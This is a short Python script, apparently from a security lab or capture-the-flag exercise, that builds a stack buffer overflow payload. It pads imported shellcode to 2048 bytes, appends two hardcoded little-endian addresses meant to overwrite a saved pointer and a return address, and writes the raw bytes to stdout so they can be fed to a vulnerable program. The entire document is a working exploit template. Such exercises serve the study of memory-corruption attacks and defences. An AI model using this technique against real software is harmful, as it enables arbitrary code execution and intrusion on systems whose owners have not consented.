import sys
import struct
from shellcode import shellcode  

buf_addr = 0xfff6dd48
ret_addr = 0xfff6e55c

buf_size = 2048
buf = shellcode.ljust(buf_size, b'A')
a = struct.pack("<I", buf_addr)
p = struct.pack("<I", ret_addr)
payload = buf + a + p

sys.stdout.buffer.write(payload)
